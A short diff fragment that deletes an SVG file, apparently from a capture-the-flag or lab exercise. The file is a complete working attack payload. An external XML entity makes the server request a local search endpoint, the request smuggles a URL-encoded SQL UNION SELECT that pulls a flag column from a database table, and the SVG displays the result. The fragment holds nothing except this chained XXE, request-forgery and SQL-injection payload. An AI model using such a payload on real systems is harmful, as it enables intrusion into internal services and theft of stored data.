@@ -1,6 +1,0 @@
- 
- <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8001/search?q=%27%20UNION%20SELECT%20flag_63fa6a8b4183cf95%2CNULL%20FROM%20_0dab7bad101846f6"> ]>
-<!-- -->
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
-    <text x="10" y="20">&xxe;</text>
-</svg>
